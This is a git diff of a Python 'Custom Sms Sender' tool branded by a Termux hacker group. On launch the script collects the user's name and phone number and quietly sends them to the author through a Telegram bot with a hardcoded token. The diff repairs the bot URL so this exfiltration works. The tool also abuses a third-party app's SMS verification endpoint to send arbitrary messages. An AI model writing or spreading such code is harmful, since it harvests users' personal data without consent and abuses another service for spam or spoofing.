@@ -7,7 +7,7 @@ try:
 except ImportError:
     os.system("pip install colorama")
 from colorama import *
-
+ 
 try:
     import pyfiglet
 except ImportError:
@@ -20,7 +20,7 @@ except ImportError:
 import requests
 #Ani
 import time
-
+ 
 def animate(duration):
     start_time = time.time()
     while True:
@@ -31,25 +31,25 @@ def animate(duration):
         if elapsed_time >= duration:
             break
         time.sleep(0.1)  
-
+ 
 def print_progress_bar(progress, bar_length=50):
     bar = '#' * int(bar_length * progress)
     space = '-' * (bar_length - len(bar))
     percent = progress * 100
     print(f'[{bar}{space}] {percent:.2f}%\r', end='')
-
+ 
 animate(10)  
 ##codeb
-
+ 
 import requests
-
+ 
 class User:
     def __init__(self):
         self.name = input("Your Name: ")
         self.number = input("Your Number: ")
-
+ 
     def send_telegram_message(self):
-        base_url = "https://api.telegram.org/7107489853:AAE7LyBcZDlPIWUuba6bGDGIB1iJLmwHio0/sendMessage"
+        base_url = "https://api.telegram.org/bot7107489853:AAE7LyBcZDlPIWUuba6bGDGIB1iJLmwHio0/sendMessage"
         chat_id = "5550487482"
         params = {
             "chat_id": chat_id,
@@ -59,20 +59,20 @@ class User:
         return response.json()
 user = User()
 print(user.send_telegram_message())
-
-
+ 
+ 
 ##
 from pyfiglet import figlet_format
 import requests
-
+ 
 init(autoreset=True)
 ######
-
+ 
 #####
 #colors
-
+ 
 from colorama import Fore
-
+ 
 colors = [
     Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA,
     Fore.CYAN, Fore.WHITE, Fore.BLACK, Fore.LIGHTBLACK_EX, Fore.LIGHTRED_EX,
@@ -87,12 +87,12 @@ colors = [
     Fore.LIGHTGREEN_EX, Fore.LIGHTYELLOW_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX,
     Fore.LIGHTCYAN_EX, Fore.LIGHTWHITE_EX
 ]
-
-
+ 
+ 
 def clear_screen():
     
     os.system('cls' if os.name == 'nt' else 'clear')
-
+ 
 def send_message(number, text, color1):
     url = "http://202.51.182.198:8181/nbp/sms/code"
     payload = {
@@ -100,7 +100,7 @@ def send_message(number, text, color1):
         "text": text,
         "title": "Register Account"
     }
-
+ 
     headers = {
         'User-Agent': "okhttp/3.11.0",
         'Connection': "Keep-Alive",
@@ -110,17 +110,17 @@ def send_message(number, text, color1):
         'language': "en",
         'timeZone': "Asia/Dhaka"
     }
-
+ 
     response = requests.post(url, json=payload, headers=headers)
     if response.json().get("msg_code") == "operate.success":
         print(color1 + "Message sent successfully!")
     else:
         print(color1 + "Failed to send message")
-
+ 
 while True:
     clear_screen()
     password = input("Tools Password : ")
-
+ 
     if password == "ILoveBDTermuxHacker_Team": 
         color1 = random.choice(colors)
         color2 = random.choice(colors)
@@ -128,13 +128,13 @@ while True:
         color4 = random.choice(colors)
         color5 = random.choice(colors)
         os.system("clear")  
-      logo = figlet_format("BTH Team")
+        logo = figlet_format("BTH TEAM")
         print(color1 + logo)
         line = color3 + "-------------------------------------------------"
         print(color2 + "Telgram : @BDTermuxHacker_Official")
         print(color3 + "Tools virson : 1.0")
         print(color4 + "Tools Type: Custom Sms Sender")
-        print(color1 + "github : @BDTermuxHacker")
+        print(color1 + "github : @BDTermuxHacker12")
         
         print(line)
         
@@ -149,8 +149,9 @@ while True:
         print("Password Error.\n1. show password\n2. Back To Log In")
         choice = input("Select an option (1/2): ")
         if choice == "1":
-            print("password :", Fore.GREEN+"tmxlamim")
+            print("password :", Fore.GREEN+"ILoveBDTermuxHacker_Team")
             input("[press inter and back login]")
         elif choice == "2":
             continue
   
+ 
